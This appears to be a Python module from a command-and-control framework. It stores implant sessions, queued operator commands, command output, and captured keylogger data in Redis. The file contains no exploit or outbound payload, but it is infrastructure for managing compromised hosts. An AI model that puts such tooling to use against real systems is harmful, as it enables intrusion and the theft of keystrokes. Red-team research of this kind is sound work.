#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/redisquery.py

    data structure:

    guid:prompt             1.1.1.1:RingZer0\Mr.Un1k0d3r
    guid:id                 1
    guid:active             timestamp
    guid:cmd:timestamp      whoami
    guid:output:timestamp   RingZer0\Mr.Un1k0d3r

"""

import redis
import time
import base64
from core.ui import UI
from core.utils import Utils

class RedisQuery:

    def __init__(self, config):
        self.config = config
        self.init_redis()

    def init_redis(self):
        try:
            self.conn = redis.StrictRedis(host=self.config.get("redis-host"), port=int(self.config.get("redis-port")), db=0)
            self.set_last_id()
        except:
            UI.error("Failed to connect to the redis instance", True)

    def set_last_id(self):
        id = self.get_data("shell:id")
        if id is None:
            self.set_key("shell:id", 1)

    def set_key(self, key, value):
        return self.conn.set(key, value)

    def get_data(self, key):
        return self.conn.get(key)

    def scan_data(self, keyword):
        return self.conn.scan_iter(keyword)

    def delete_entry(self, key):
        self.conn.delete(key)

    def get_id(self, guid):
        index = self.get_data("shell:id")
        self.set_key("%s:id" % guid, index)
        self.conn.incr("shell:id")
        return index

    def set_prompt(self, guid, prompt):
        self.set_key("%s:prompt" % guid, prompt)

    def get_prompt(self, guid):
        return self.get_data("%s:prompt" % guid)

    def update_checkin(self, guid, ip):
        self.delete_entry("%s:active:%s" % (guid, ip))
        self.set_key("%s:active:%s" % (guid, ip), Utils.timestamp())

    def get_last_checkin(self, guid):
        return self.get_data("%s:active" % guid)

    def push_cmd(self, guid, cmd, cmd_guid, origin,):
        timestamp = str(time.time())
        for session in self.get_active_session(guid):
            session = session.decode().split(":")
            session_uid = session[0]
            session_id = session[2]
            cmds = "%s:%s" % (origin, cmd)
            self.set_key("%s:session_cmd:%s" % (session_uid, session_id), cmds)
        data = "%s:%s" % (cmd_guid, cmd)
        self.set_key("%s:cmd:%s" % (guid, timestamp), data)

    def get_cmd(self, guid):
        data = list(self.scan_data("%s:cmd:*" % guid))
        if len(data) > 0:
            key = data.pop(0)
            data = self.get_data(key)
            self.delete_entry(key)
            return data.decode()
        return None

    def push_output(self, guid, output, cmd_guid,):
        timestamp = str(time.time())
        for session in self.get_active_session(guid):
            session = session.decode().split(":")
            session_uid = session[0]
            session_id = session[2]
            self.conn.append("%s:session_output:%s" % (session_uid, session_id), output)
        self.set_key("%s:%s:output:%s" % (guid, cmd_guid, timestamp), output)

    def get_output(self, guid, cmd_guid):
        data = []
        for item in self.scan_data("%s:%s:output:*" % (guid, cmd_guid)):
            data.append(self.get_data(item))
            self.delete_entry(item)
            return data
        return []

    def get_all_shells(self):
        return self.scan_data("*:active:*")

    def get_all_shell_id(self):
        return self.scan_data("*:id")

    def delete_all_by_guid(self, guid):
        for item in self.scan_data("*%s*" % guid):
            self.delete_entry(item)

    def flushdb(self):
        self.conn.flushdb()
        self.conn.flushall()

    def update_config(self, config):
        self.config = config
        return self

    def append_keylogger_data(self, guid, data):
        data = base64.b64decode(data).decode()
        return self.conn.append("%s:keylogger" % guid, "%s" % data)

    def get_keylogger_data(self, guid):
        return self.get_data("%s:keylogger" % guid)

    def append_shell_data(self, guid, data):
        return self.conn.append("%s:shell-data" % guid, "%s" % data)

    def get_shell_data(self, guid):
        return self.get_data("%s:shell-data" % guid)

    def add_active_user(self, uid, id):
        return self.set_key("%s:session:%s" % (uid, id), "active")

    def remove_active_user(self, uid, id):
        return self.delete_entry("%s:session:%s" % (uid, id))

    def get_active_session(self, id):
        return self.scan_data("*:session:%s" % id)

    def get_active_cli_session_cmd(self, guid):
        return self.scan_data("%s:session_cmd:*" % guid)

    def get_active_cli_session_output(self, guid):
        return self.scan_data("%s:session_output:*" % guid)

    def get_active_gui_session_cmd(self, guid, id):
        return self.scan_data("%s:session_cmd:%s" % (guid, id))

    def get_active_gui_session_output(self, guid, id):
        return self.scan_data("%s:session_output:%s" % (guid, id))

    def get_session_cmd(self, key):
        return self.get_data(key)

    def get_session_output(self, key):
        return self.get_data(key)

    def append_server_events(self,data):
        return self.conn.append("events", data)

    def get_server_events(self):
        return self.get_data("events")